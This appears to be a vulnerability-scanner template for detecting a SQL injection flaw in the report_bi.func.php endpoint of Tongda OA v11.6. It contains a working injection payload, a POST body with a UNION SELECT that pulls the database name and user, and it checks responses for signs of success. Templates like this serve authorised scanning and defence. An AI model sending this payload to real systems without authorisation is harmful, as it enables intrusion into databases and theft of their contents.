id: tongda-report-func-sqli
brief:
    title: Tongda OA v11.6 report_bi.func.php - SQL injection
    by: SleepingBag945
    level: high
    about: Tongda OA v11.6 report_bi.func.php has a SQL injection vulnerability, and attackers can obtain database information through the vulnerability.
    label:
        - tongda
        - sqli
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/general/bi_design/appcenter/report_bi.func.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
      signs:
        - "on": word
          has:
            - '"root@'
            - '"para":'
            - '"td_oa"'
          in: body
          need: all
        - "on": status
          status:
            - 200
